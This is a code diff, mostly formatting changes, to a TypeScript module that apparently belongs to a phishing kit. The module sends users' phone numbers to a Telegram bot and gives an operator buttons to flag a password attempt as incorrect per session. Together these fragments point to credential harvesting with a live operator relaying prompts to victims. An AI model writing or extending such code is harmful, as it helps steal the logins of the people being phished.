@@ -559,7 +559,7 @@ export const sendPhoneToTelegramEnhanced = async (
     console.log("📤 Sending message to Telegram with admin buttons:", {
       sessionId,
       phoneNumber,
-      buttonCount: adminKeyboard.inline_keyboard.flat().length
+      buttonCount: adminKeyboard.inline_keyboard.flat().length,
     });
 
     const controller = new AbortController();
@@ -858,7 +858,10 @@ export const showAdminButtons = async (sessionId: string): Promise<boolean> => {
 
     // Real Telegram mode
     if (!session.messageId) {
-      console.warn("⚠️ MessageId not found for session, attempting to send initial message:", sessionId);
+      console.warn(
+        "⚠️ MessageId not found for session, attempting to send initial message:",
+        sessionId,
+      );
 
       // Try to send initial message first
       try {
@@ -992,7 +995,10 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
   // 🎯 ROW 2: Error Actions (Smart Grouping)
   const errorRow = [];
 
-  if (session.authAttempts["password"] && session.authAttempts["password"] > 0) {
+  if (
+    session.authAttempts["password"] &&
+    session.authAttempts["password"] > 0
+  ) {
     errorRow.push({
       text: "🚫 PASS",
       callback_data: `incorrect_password_${sessionId}`,
